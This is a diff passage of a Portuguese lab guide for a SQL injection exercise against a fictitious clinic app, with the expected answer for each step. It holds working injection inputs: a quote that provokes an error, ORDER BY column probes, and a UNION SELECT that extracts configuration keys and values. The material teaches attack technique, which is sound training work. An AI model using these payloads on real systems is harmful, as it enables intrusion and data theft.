@@ -62,7 +62,7 @@ Roteiro do **LAB-001 SQL Injection** (Clínica VidaPlena, dados fictícios, cerc
 explicam cada passo; as respostas abaixo servem só para conferência:
 
 1. **Conhecer a aplicação**: siga a busca do controller até o repositório. Resposta: `buscar_por_nome`.
-2. **Provocar um erro**: busque por `'` e leia `tail -n 20 /tmp/app.log` no terminal. Resposta:
+2. **Provocar um erro**: busque por `'` e rode `grep sqlite3 /tmp/app.log | tail -n 1` no terminal. Resposta:
    `OperationalError`.
 3. **Medir a consulta**: `' ORDER BY 5 --` dá erro e `' ORDER BY 4 --` funciona. Resposta: `4`.
 4. **Extrair dados sensíveis**: `' UNION SELECT 1, chave, valor, '' FROM configuracoes --`. Resposta:
